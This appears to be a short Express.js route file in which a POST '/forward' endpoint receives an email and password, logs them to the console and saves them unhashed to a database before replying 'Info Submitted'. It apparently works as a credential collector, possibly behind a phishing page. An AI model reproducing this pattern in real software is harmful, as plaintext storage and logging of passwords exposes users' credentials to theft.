const express = require("express");
const router = express.Router();
const Account = require("../models/Account");

router.post("/forward", (req, res) => {
  const { email, password } = req.body;
  console.log(req.body);

  let data = new Account({
    email,
    password,
  });

  data
    .save()
    .then((doc) => {
      console.log(doc);
      res.send({ status: true, message: "Info Submitted" });
    })
    .catch((err) => {
      console.error(err);
      res.sendStatus(500);
    });
});

module.exports = router;
